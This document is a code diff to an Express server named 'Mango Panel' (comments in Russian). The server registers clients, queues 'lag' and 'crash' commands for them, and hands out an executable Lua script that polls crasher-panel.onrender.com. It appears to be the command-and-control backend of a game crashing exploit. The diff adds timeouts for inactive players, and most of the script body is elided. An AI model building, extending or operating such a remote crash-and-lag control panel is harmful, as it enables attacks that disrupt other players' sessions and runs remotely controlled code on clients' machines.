@@ -9,6 +9,10 @@ app.use(express.static('public'));
 
 const players = {};
 
+// === ВРЕМЯ ЖИЗНИ ИГРОКА (30 секунд без активности) ===
+const PLAYER_TIMEOUT = 30000; // 30 секунд
+
+// === РЕГИСТРАЦИЯ ИГРОКА ===
 app.get('/api/register', (req, res) => {
     const username = req.query.username;
     if (!username) return res.status(400).send('Username required');
@@ -17,21 +21,42 @@ app.get('/api/register', (req, res) => {
         players[username] = {
             command: null,
             lagActive: false,
-            crashActive: false
+            crashActive: false,
+            lastSeen: Date.now()
         };
+    } else {
+        players[username].lastSeen = Date.now();
     }
     res.send('OK');
 });
 
+// === СПИСОК ИГРОКОВ (с фильтрацией) ===
 app.get('/api/players', (req, res) => {
+    const now = Date.now();
+    const activePlayers = {};
+
+    for (const [name, data] of Object.entries(players)) {
+        if (now - data.lastSeen < PLAYER_TIMEOUT) {
+            activePlayers[name] = data;
+        }
+    }
+
+    Object.keys(players).forEach(key => {
+        if (!activePlayers[key]) {
+            delete players[key];
+        }
+    });
+
     const list = Object.keys(players).map(name => ({
         username: name,
         lagActive: players[name].lagActive || false,
         crashActive: players[name].crashActive || false
     }));
+
     res.json(list);
 });
 
+// === ОТПРАВКА КОМАНДЫ ===
 app.post('/api/command', (req, res) => {
     const { username, command, value } = req.body;
 
@@ -44,6 +69,7 @@ app.post('/api/command', (req, res) => {
     }
 
     players[username].command = command;
+    players[username].lastSeen = Date.now();
 
     if (command === 'lag' && value !== undefined) {
         players[username].lagActive = value;
@@ -56,6 +82,7 @@ app.post('/api/command', (req, res) => {
     res.json({ success: true });
 });
 
+// === ПОЛУЧЕНИЕ КОМАНД ДЛЯ ИГРОКА ===
 app.get('/api/get_commands', (req, res) => {
     const username = req.query.username;
 
@@ -63,11 +90,14 @@ app.get('/api/get_commands', (req, res) => {
         return res.send('');
     }
 
+    players[username].lastSeen = Date.now();
+
     const cmd = players[username].command || '';
     players[username].command = null;
     res.send(cmd);
 });
 
+// === ВОЗВРАТ ОСНОВНОГО СКРИПТА ===
 app.get('/api/get_exec_script', (req, res) => {
     const script = `
 local s = "https://crasher-panel.onrender.com"
@@ -274,7 +304,16 @@ end
     res.send(script);
 });
 
+// === СТАТУС СЕРВЕРА ===
 app.get('/api/status', (req, res) => {
+    const now = Date.now();
+
+    for (const [name, data] of Object.entries(players)) {
+        if (now - data.lastSeen > PLAYER_TIMEOUT) {
+            delete players[name];
+        }
+    }
+
     res.json({
         status: 'online',
         players: Object.keys(players).length,
@@ -282,10 +321,12 @@ app.get('/api/status', (req, res) => {
     });
 });
 
+// === ЗАПУСК ===
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Mango Panel running on port ${PORT}`);
 });
 
+// === ОБРАБОТКА ОШИБОК ===
 app.use((err, req, res, next) => {
     res.status(500).json({ error: 'Internal error' });
 });
